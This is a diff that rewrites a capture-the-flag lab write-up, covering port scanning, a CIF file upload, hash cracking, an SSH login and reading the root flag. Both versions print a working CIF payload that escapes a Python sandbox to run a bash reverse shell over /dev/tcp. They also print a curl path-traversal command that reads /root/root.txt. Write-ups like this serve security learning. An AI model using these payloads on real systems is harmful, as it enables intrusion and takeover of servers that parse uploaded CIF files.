@@ -1,7 +1,15 @@
-1. Namp on ip found 22 and 5000 open
-2. tested 5000 it had file cif upload
-3. searched around for CIF vulns and found the payload for RCE:
- data_Example
+1. Initial Scan:
+Performed a network scan on the target IP and identified that ports 22 (SSH) and 5000 (HTTP) were open.
+
+2. Service Testing:
+Focused on port 5000 and discovered it allowed the upload of CIF (Crystallographic Information File) files.
+
+3. Vulnerability Exploration:
+Conducted further analysis of the CIF file upload functionality and found potential vulnerabilities. After researching known vulnerabilities in CIF files, I came across a Remote Code Execution (RCE) payload.
+
+The payload injected into the CIF file was as follows:
+
+data_Example
 _cell_length_a    10.00000
 _cell_length_b    10.00000
 _cell_length_c    10.00000
@@ -10,19 +18,25 @@ _cell_angle_beta  90.00000
 _cell_angle_gamma 90.00000
 _symmetry_space_group_name_H-M 'P 1'
 loop_
- _atom_site_label
- _atom_site_fract_x
- _atom_site_fract_y
- _atom_site_fract_z
- _atom_site_occupancy
- H 0.00000 0.00000 0.00000 1
- O 0.50000 0.50000 0.50000 1
+_atom_site_label
+_atom_site_fract_x
+_atom_site_fract_y
+_atom_site_fract_z
+_atom_site_occupancy
+H 0.00000 0.00000 0.00000 1
+O 0.50000 0.50000 0.50000 1
 
-_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/127.0.0.1/6666 0>&1\'");0,0,0'
+_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/127.0.0.1/6666 0>&1\'");0,0,0'
 _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
-and took the revshell on nc
-4. checked aorund and found the database that containts users pass hash and cracked it and logged in as rosa user via ssh
-5.for root flag used below payload
+
+This payload enabled the execution of a reverse shell, which was successfully caught using nc (Netcat).
+
+4. Post-Exploitation:
+After gaining access to the system, I conducted further exploration and discovered a database containing user password hashes. These hashes were cracked, and I was able to successfully log in as the rosa user via SSH.
+
+5. Privilege Escalation:
+To escalate to root privileges and retrieve the root flag, I used the following command to access the root.txt file:
+
 curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt
 
